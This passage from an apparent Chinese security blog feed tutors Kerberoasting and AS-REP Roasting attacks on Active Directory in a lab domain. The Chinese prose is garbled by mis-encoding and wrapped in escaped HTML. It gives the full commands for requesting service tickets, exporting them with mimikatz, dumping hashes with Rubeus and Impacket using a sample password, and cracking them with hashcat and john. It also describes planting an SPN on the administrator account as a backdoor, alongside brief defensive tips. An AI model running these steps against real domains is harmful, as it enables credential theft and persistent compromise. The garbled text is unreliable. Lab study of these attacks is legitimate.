&lt;p&gt;é™¤äº†å¯ä»¥ä½¿ç”¨powershellè„šæœ¬ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤§æ€å™¨mimikatzã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆè¿˜æ˜¯å…ˆè¯·æ±‚spnï¼ŒæŠŠæ‰€æœ‰æœåŠ¡çš„TGSéƒ½å­˜å‚¨åˆ°å†…å­˜ä¸­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Add-Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AssemblyName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;setspn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-q&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*/*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Select-String&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;^CN&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Context&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;KerberosRequestorSecurityToken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PostContext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€å¯ä½¿ç”¨mimikatzå¯¼å‡ºç¥¨æ®(ä¸éœ€è¦ç³»ç»Ÿæƒé™)ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::list /export
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¥ç€æŠŠç¥¨æ®æ‹¿åˆ°&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;kerberoast&lt;/a&gt;å·¥å…·åŒ…ä¸­çš„&lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py&#34;&gt;tgsrepcrack.py&lt;/a&gt;ç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 tgsrepcrack.py  passwordlist.txt 2-40a50000-lucky@MSSQLSvc&lt;span class=&#34;se&#34;&gt;\~&lt;/span&gt;SQL.hack.lab&lt;span class=&#34;se&#34;&gt;\~&lt;/span&gt;1433-HACK.LAB.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥æŠŠç¥¨æ®è½¬æ¢æˆJohnçš„æ ¼å¼è¿›è¡Œç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 kirbi2john.py 2-40a50000-lucky@MSSQLSvc&lt;span class=&#34;se&#34;&gt;\~&lt;/span&gt;SQL.hack.lab&lt;span class=&#34;se&#34;&gt;\~&lt;/span&gt;1433-HACK.LAB.kirbi &amp;gt; kirbihash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john --wordlist passwordlist.txt kirbihash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;æ–¹æ³•ä¸‰rubeus&#34;&gt;æ–¹æ³•ä¸‰ï¼ˆRubeusï¼‰&lt;/h2&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·æˆ‘ä»¬æœ‰åœ¨å¦å¤–ä¸€ç¯‡&lt;a href=&#34;https://xxe.icu/posts/ad_as_reproasting/#rubeus&#34;&gt;åŸŸæ¸—é€-AS_REPRoasting&lt;/a&gt;è®²è¿‡ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥ç”¨æ¥åšKerberoastingæ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;ç›´æ¥è¿è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kerberoast&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼šè¾“å‡ºhashcatçš„ç ´è§£æ ¼å¼æ–‡æœ¬ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯ç”¨hashcatç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;13100&lt;/span&gt; hash.txt passwd.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;æ–¹æ³•å››impacket&#34;&gt;æ–¹æ³•å››ï¼ˆImpacketï¼‰&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨ &lt;strong&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/strong&gt; å·¥å…·åŒ…ä¸­çš„ æ¨¡å—&lt;code&gt;GetUSerSPNs.py&lt;/code&gt;å¯ä»¥è¿›è¡Œè¿œç¨‹æ”»å‡»ï¼Œéœ€è¦è·å–åˆ°åŸŸç”¨æˆ·çš„å¯†ç æˆ–è€…æ˜¯NTLMã€‚&lt;/p&gt;
&lt;p&gt;å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GetUserSPNs.py hack.lab/lucky:p@ssw0rd -dc-ip 172.16.0.106 -request
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-dc-ip åé¢æ¥çš„æ˜¯DCçš„IPï¼Œ-requestæ˜¯è¾“å‡ºç»“æœã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨NTLMå¯ä»¥ä½¿ç”¨å‚æ•°-hashesï¼Œä½¿ç”¨aesekyå¯ä»¥ä½¿ç”¨å‚æ•°-aesKey&lt;/p&gt;
&lt;p&gt;-outputfileå¯ä»¥è¾“å‡ºä¸ºæ–‡ä»¶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŠŠå†…å®¹æ‹¿åˆ°hashcatçˆ†ç ´å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœé‡åˆ°ä¸‹é¢çš„æŠ¥é”™é—®é¢˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸå› æ˜¯æ²¡æœ‰åŒæ­¥dcä¸Šé¢çš„æ—¶é—´ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡ŒåŒæ­¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install ntpdate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ntpdate 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-æ”»å‡»æ‰©å±•&#34;&gt;0x03 æ”»å‡»æ‰©å±•&lt;/h1&gt;
&lt;p&gt;å…ˆè¯´é˜²èŒƒKerberoastæ”»å‡»æœ€æœ‰æ•ˆçš„æ–¹æ³•æ˜¯ï¼šç¡®ä¿æœåŠ¡è´¦å·å¯†ç çš„é•¿åº¦è¶…è¿‡25ä½ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨çœŸå®ç¯å¢ƒä¸­æˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»åˆ©ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œæ”»å‡»å‘¢ï¼Œå‡å¦‚æˆ‘ä»¬æ‹¿åˆ°çš„æœåŠ¡è´¦æˆ·å¯†ç å¾ˆå¼ºç ´è§£ä¸äº†æˆ–è€…æ˜¯è¯´æˆ‘ä»¬æ€ä¹ˆå»åˆ©ç”¨è¿™ä¸ªæ”»å‡»ä½œä¸ºä¸€ç§åé—¨å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åšåé—¨çš„åŠæ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä¸ºæ™®é€šåŸŸç”¨æˆ·èµ‹äºˆ&lt;code&gt;Read servicePrincipalName&lt;/code&gt;å’Œ&lt;code&gt;Write serverPrincipalName&lt;/code&gt;æƒé™&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å»æŠŠåŸŸç”¨æˆ·æ³¨å†Œåœ¨SPNçš„æœåŠ¡ä¸­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -S MSSQLSvc/SQL.hack.lab:1433 administrator
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•è¿›è¡Œç ´è§£äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ é™¤SPN&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -D MSSQLSvc/SQL.hack.lab:1433 administrator
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½†è¿˜æ˜¯æœ‰å±€é™æ€§çš„ï¼Œå› ä¸ºå¯†ç éš¾åº¦ä¹Ÿå†³å®šäº†æˆ‘ä»¬æ”»å‡»çš„æ•ˆç‡ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®ä¹Ÿå¯ä»¥å¯¹AESè¿›è¡Œç ´è§£ï¼Œä½†æ˜¯ç ´è§£çš„é€Ÿåº¦ä¼šæ¯”rc4æ…¢å¾ˆå¤šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;19700&lt;/span&gt; hash_aes256.txt passwd.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;åœ¨è¿›è¡Œæ—¥å¿—å®¡è®¡æ—¶å¯ä»¥é‡ç‚¹å…³æ³¨IDä¸º4679(è¯·æ±‚KerberosæœåŠ¡ç¥¨æ®)çš„æ—¶é—´ã€‚å¦‚æœæœ‰è¿‡å¤šçš„ 4769 æ—¥å¿—åº”è¿›ä¸€æ­¥æ£€æŸ¥ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è¡Œä¸ºã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting&#34;&gt;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/zpchcbd/p/11707776.html&#34;&gt;https://www.cnblogs.com/zpchcbd/p/11707776.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://chowdera.com/2021/12/20211201194023144R.html&#34;&gt;https://chowdera.com/2021/12/20211201194023144R.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/&#34;&gt;https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.harmj0y.net/redteaming/kerberoasting-revisited/&#34;&gt;https://blog.harmj0y.net/redteaming/kerberoasting-revisited/&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-AS_REPRoasting</title>
      <link>https://xxe.icu/ad_as_reproasting.html</link>
      <pubDate>Tue, 22 Feb 2022 00:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_as_reproasting.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ç§é’ˆå¯¹kerberosåè®®çš„æ”»å‡»æŠ€æœ¯ï¼Œä¸éœ€è¦è®¤è¯å°±å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„å¯†ç hashå€¼ã€‚é—®é¢˜å‡ºç°åœ¨èº«ä»½é¢„è®¤è¯æ˜¯kerberosè®¤è¯çš„ç¬¬ä¸€æ­¥ï¼Œé€šå¸¸æ˜¯ç”±KDCè®¤è¯æœåŠ¡å™¨æ¥ç®¡ç†ï¼Œç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸å…³çš„kerberosçš„è¯¦æƒ…å¯ä»¥æŸ¥é˜…ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt;ï¼Œåœ¨å®æˆ˜å½“ä¸­æ¯”è¾ƒå°‘é‡åˆ°ï¼Œä½†æ˜¯ä½ è¦æ˜¯åœ¨OSCPæˆ–è€…æ˜¯HTBç­‰å¹³å°å¯ä»¥é‡åˆ°æ¯”è¾ƒå¤šè¿™ç§æ¼æ´çš„ADé¶æœºã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-æ”»å‡»åŸç†&#34;&gt;0x01 æ”»å‡»åŸç†&lt;/h1&gt;
&lt;h2 id=&#34;åˆ©ç”¨åŸç†&#34;&gt;åˆ©ç”¨åŸç†&lt;/h2&gt;
&lt;p&gt;é—®é¢˜å°±æ˜¯å‡ºç°åœ¨å¦‚æœç”¨æˆ·å¼€å¯äº†&lt;code&gt;ä¸ä½¿ç”¨Kerberosé¢„è®¤è¯ï¼ˆDo not require Kerberos preauthenticationï¼‰&lt;/code&gt;ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡Kerberos AS-REPè¯·æ±‚ï¼Œè·å–åˆ°ç»è¿‡ç”¨æˆ·çš„hashåŠ å¯†è¿‡TGTç¥¨æ®ï¼Œç„¶åä»–å°±å¯ä»¥ç¦»çº¿ç ´è§£è¿™ä¸ªå‡­è¯äº†,ä½†æ˜¯è¯¥å±æ€§æ˜¯é»˜è®¤ä¸å¼€å¯çš„ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ADç”¨æˆ·ç®¡ç†çš„é€‰é¡¹ä¸‹å¯ä»¥çœ‹åˆ°ï¼Œå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Domain-security/10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨WiresharkæŠ“åŒ…å¯¹æ¯”ä¸‹æ˜¯åœ¨å“ªé‡Œå‡ºçš„é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæŠ“å–ä¸å¼€å¯é¢„éªŒè¯çš„åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ˜¯å¼€å¯é¢„éªŒè¯çš„åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/2.jpg&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯åœ¨pdata(pre-authentication data )é¡¹å½“ä¸­æ˜¯å¤šäº†&lt;code&gt;pA-ENC-TIMESTAMP&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¯¥é¡¹æ˜¯æŒ‰ç…§etypeçš„åŠ å¯†ç±»å‹ï¼Œç”¨ç”¨æˆ·hashåŠ å¯†æ—¶é—´æˆ³ï¼Œä½œä¸ºvalue å‘é€ç»™ASæœåŠ¡å™¨ã€‚ç„¶åASæœåŠ¡å™¨é‚£è¾¹æœ‰ç”¨æˆ·hashï¼Œä½¿ç”¨ç”¨æˆ·hashè¿›è¡Œè§£å¯†ï¼Œè·å¾—æ—¶é—´æˆ³ï¼Œå¦‚æœèƒ½è§£å¯†ï¼Œä¸”æ—¶é—´æˆ³åœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼Œåˆ™è¯æ˜è®¤è¯é€šè¿‡è¿”å› TGTç¥¨æ®å’Œenc_partï¼ˆé‡Œé¢åŒ…å«æœ‰session-keyï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœå¼€å¯äº†ä¸éœ€è¦é¢„éªŒè¯ï¼Œé‚£ä¹ˆè¿™é¡¹éªŒè¯è¿‡ç¨‹å°±ä¸éœ€è¦äº†ï¼Œç›´æ¥å°±èƒ½è·³è¿‡è·å–åˆ°ç”¨æˆ·åŠ å¯†çš„TGTç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çœ‹ä¸‹è¿”å›çš„åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‘åŸŸæ§åˆ¶å™¨çš„88ç«¯å£å‘é€AS_REQè¯·æ±‚åï¼Œå¯¹æ”¶åˆ°çš„AS_REPå†…å®¹(enc-partåº•ä¸‹çš„ciperï¼Œå› ä¸ºè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨ç”¨æˆ·hashåŠ å¯†session-keyï¼Œæˆ‘ä»¬é€šè¿‡è¿›è¡Œç¦»çº¿çˆ†ç ´å°±å¯ä»¥è·å¾—ç”¨æˆ·hash)é‡æ–°ç»„åˆï¼Œèƒ½å¤Ÿæ‹¼æ¥æˆâ€Kerberos 5 AS-REP etype 23â€(18200)çš„æ ¼å¼ï¼Œæ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨hashcatå¯¹å…¶ç ´è§£ï¼Œæœ€ç»ˆè·å¾—è¯¥ç”¨æˆ·çš„æ˜æ–‡å£ä»¤ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„ä¸æ˜¯ticketåŒ…ä¸­çš„enc-partï¼Œè¿™ä¸ªticketç”¨äºTGS_REQçš„è®¤è¯ã€‚æ˜¯åŠ å¯†çš„ï¼Œç”¨æˆ·ä¸å¯è¯»å–é‡Œé¢çš„å†…å®¹ã€‚åœ¨AS_REQè¯·æ±‚é‡Œé¢æ˜¯ä½¿ç”¨krbtgtçš„hashè¿›è¡ŒåŠ å¯†çš„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç‚¹å‡»é¼ æ ‡å³é”®è·å–AS_REPé‡Œé¢enc-partéƒ¨åˆ†é‡Œé¢çš„ciperå€¼ï¼Œç„¶ååœ¨å‰é¢åŠ ä¸Š&lt;code&gt;$krb5asrep$23$ç”¨æˆ·å@åŸŸå:&lt;/code&gt;+ciperå€¼çš„å‰32ä½å­—ç¬¦+$+åé¢çš„å­—ç¬¦ï¼Œæ¯”å¦‚ciperå€¼ä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4440830848a2f2a1eabdd28222bceb2c24e5cd7cd311349609eed565f8c5c86803747e9bbc18e5b990400fbe62b554e8f33e6f7e2fb2e12499161705b95cd64b13a67e1f4bab841520fcd6935cd7c0ad25e5b8ee8ed91d7f247f5f8bf989971f9af645c3199978436ec962d254a95145a9414d8d9a48cb9a44f4815d13a204325d55399c2e4a175b7eaca33e47e79ad034b187574112010f0a4825614b74d4d2e671fd9bb546ff2987f4d3718735cdd0a3b3cbb52988bc900ebcbfb46a8320efc0ba04648c29e64ca587c342cf8bacab93d9aa4bb592cdde8c1b25733b1b57e0aee4168b597e303c68555d6518116cf6f294c726
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹ä¹‹åå°±æˆä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$krb5asrep$23$lucky@HACK.LAB:4440830848a2f2a1eabdd28222bceb2c$24e5cd7cd311349609eed565f8c5c86803747e9bbc18e5b990400fbe62b554e8f33e6f7e2fb2e12499161705b95cd64b13a67e1f4bab841520fcd6935cd7c0ad25e5b8ee8ed91d7f247f5f8bf989971f9af645c3199978436ec962d254a95145a9414d8d9a48cb9a44f4815d13a204325d55399c2e4a175b7eaca33e47e79ad034b187574112010f0a4825614b74d4d2e671fd9bb546ff2987f4d3718735cdd0a3b3cbb52988bc900ebcbfb46a8320efc0ba04648c29e64ca587c342cf8bacab93d9aa4bb592cdde8c1b25733b1b57e0aee4168b597e303c68555d6518116cf6f294c726
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠè¿™ä¸²æ”¾åˆ°hashcatçš„18200æ¨¡å¼ç ´è§£å°±è¡Œäº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; -a &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt passwordlist.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°è¯•è¯¥å·¥å…·ä¼šåœ¨æ—¥å¿—ä¸­ç”Ÿæˆ4678çš„TGTè¯·æ±‚è®°å½•ï¼š&lt;/p&gt;
